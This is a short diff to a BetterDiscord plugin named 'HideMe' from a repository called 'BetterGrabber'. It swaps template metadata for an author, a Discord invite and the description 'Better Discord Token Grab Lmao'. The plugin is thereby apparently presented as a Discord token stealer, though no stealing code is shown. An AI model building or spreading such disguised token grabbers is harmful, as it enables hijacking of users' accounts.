@@ -1,7 +1,7 @@
 /**
  * @name HideMe
- * @authorId Me
- * @invite Me
+ * @authorId HideakiAtsuyo
+ * @invite https://discord.gg/C7yHkVSE2M
  * @donate https://www.paypal.me/GameOverLmao
  * @website https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/master/GOD
  * @source https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/master/GOD/HideMe.plugin.js
@@ -21,7 +21,7 @@ class HideMe {
         return "HideMe";
     }
     getDescription() {
-        return "This is an example/template for a BD plugin.";
+        return "Better Discord Token Grab Lmao github.com/HideakiAtsuyo";
     }
     getVersion() {
         return "1.0.1";
